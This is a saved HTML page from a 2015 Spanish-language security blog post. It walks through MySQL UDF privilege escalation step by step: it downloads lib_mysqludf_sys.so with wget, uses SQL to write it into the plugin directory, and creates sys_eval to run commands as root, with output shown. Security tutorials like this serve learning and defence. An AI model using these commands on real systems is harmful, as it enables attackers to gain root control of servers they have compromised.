@@ -1,0 +1,198 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Mysql UDF Injection - Security Signal</title>
+  <meta name="author" content="q3rv0 - hdbreaker">
+
+  
+  <meta name="description" content="by [Q]3rv[0]Una linda manera de elevar privilegios en un sistema comprometido es aprovechando los permisos con los que corren ciertos demonios en el &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://securitysignal.github.io/blog/2015/01/13/mysql-udf-injection/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security Signal</a></h1>
+  
+    <h2>Looking for signs of insecurity...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Mysql UDF Injection</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T22:08:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>10:08 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><div style="text-align: right;"><div class="separator" style="clear: both; text-align: center;"><a href="http://st-listas.20minutos.es/images/2010-11/262092/2753258_640px.jpg?1290678559" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://st-listas.20minutos.es/images/2010-11/262092/2753258_640px.jpg?1290678559" height="300" width="400" /></a></div><div style="text-align: center;"><br /></div><b>by [Q]3rv[0]</b></div>Una linda manera de elevar privilegios en un sistema comprometido es aprovechando los permisos con los que corren ciertos demonios en el sistema como el servidor mysql.<br /><br />Una de las formas de elevar privilegios es añadir funciones a Mysql y para eso nos valemos de la interface UDF (funciones definidas por el usuario) para esto habra que contar con la libreria necesaria apartir de la cual seran llamadas. <br /><br />Teniendo los privilegios necesarios podremos crear ciertas funciones como sys_eval() la cual nos permitiran ejecutar comandos como usuario root desde la propia db.<br /><br />Ante todo debemos asegurarnos de que la base de datos corre con superprivilegios, miremos el fichero de configuracion en /etc/mysql/my.cnf<br /><br /><pre class="brush: bash"># * Basic Settings<br />#<br />user&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; = root<br />pid-file&nbsp;&nbsp;&nbsp; = /var/run/mysqld/mysqld.pid<br />socket&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; = /var/run/mysqld/mysqld.sock<br />port&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; = 3306<br />basedir&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; = /usr<br />datadir&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; = /var/lib/mysql<br />tmpdir&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; = /tmp<br />language&nbsp;&nbsp;&nbsp; = /usr/share/mysql/english</pre><br /><br />Descargamos la <span style="color: red;">libreria lib_mysqludf_sys.so</span> dentro del directorio /tmp<br /><br /><pre class="brush: bash">wget https://github.com/mysqludf/lib_mysqludf_sys/raw/master/lib_mysqludf_sys.so</pre><br /><br />Conectamos con las credenciales obtenidas a la base de datos<br /><br /><pre class="brush: bash">mysql -u "user" -p"password" database<br /><br /></pre><br />Creamos la table code<br /><br /><pre class="brush: sql">CREATE TABLE code (codigo blob);</pre><br /><br />Presten atencion al tipo de campo "blob" este sirve para almacenar datos binarios entre otros, esto hara que al momento de volcar el fichero no se produzca un cambio de ciertos caracteres que puedan llegar a generar un error cuando la libreria sea llamada.<br /><br />Insertaremos la libreria en la tabla code<br /><br /><pre class="brush: sql">INSERT INTO code VALUES(load_file('/tmp/lib_mysqludf_sys.so'));</pre><br /><br />Dumpeamos los datos en /usr/lib/mysql/plugin/ que es el directorio desde donde el servidor cargara las librerias.<br /><br /><pre class="brush: sql">SELECT * FROM code INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';</pre><br /><br />Por ultimo creamos la funcion sys_eval()<br /><br /><pre class="brush: sql">CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';</pre><br /><br />Llamamos a&nbsp; dicha función<br /><br /><pre class="brush: sql">select sys_eval('id');<br /><br />+-----------------------------------------+<br />| sys_eval('id')&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<br />+-----------------------------------------+<br />| uid=0(root) gid=0(root) groups=0(root)  |<br />|                                         |<br />+-----------------------------------------+<br /><br /></pre><br />Les dejo un video demostrativo que realice en un entorno controlado<br /><br /><center><iframe width="800" height="500" src="//www.youtube.com/embed/uaadERGHstk" frameborder="0" allowfullscreen></iframe></center><br />Saludos! </div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Security Signal</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T22:08:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>10:08 pm</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://securitysignal.github.io/blog/2015/01/13/mysql-udf-injection/" data-via="" data-counturl="http://securitysignal.github.io/blog/2015/01/13/mysql-udf-injection/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/01/13/destripando-la-logica-de-una-sqli-error/" title="Previous Post: Destripando la logica de una SQLI Error Based">&laquo; Destripando la logica de una SQLI Error Based</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/01/13/xss-y-sqli-wwwmincytgovar/" title="Next Post: XSS y SQLI www.mincyt.gov.ar">XSS y SQLI www.mincyt.gov.ar &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - q3rv0 - hdbreaker -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
